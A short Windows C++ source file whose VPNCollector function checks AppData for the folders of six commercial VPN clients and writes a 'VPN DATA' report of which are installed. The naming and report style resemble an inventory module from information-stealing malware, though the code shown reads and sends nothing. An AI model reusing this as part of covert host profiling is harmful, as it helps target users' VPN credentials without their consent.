#include "vpn_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string VPNCollector::CollectVPNData() {
    std::ostringstream result;
    result << "\n=== VPN DATA ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::vector<std::pair<std::string, std::string>> vpnApps = {
        {"Mullvad", std::string(appdata) + "\\Mullvad VPN"},
        {"NordVPN", std::string(appdata) + "\\NordVPN"},
        {"ExpressVPN", std::string(appdata) + "\\ExpressVPN"},
        {"Surfshark", std::string(appdata) + "\\Surfshark"},
        {"ProtonVPN", std::string(appdata) + "\\ProtonVPN"},
        {"Windscribe", std::string(appdata) + "\\Windscribe"}
    };
    
    int found = 0;
    for (const auto& [name, path] : vpnApps) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
        }
    }
    
    result << "Total VPN apps found: " << found << "\n";
    
    return result.str();
}
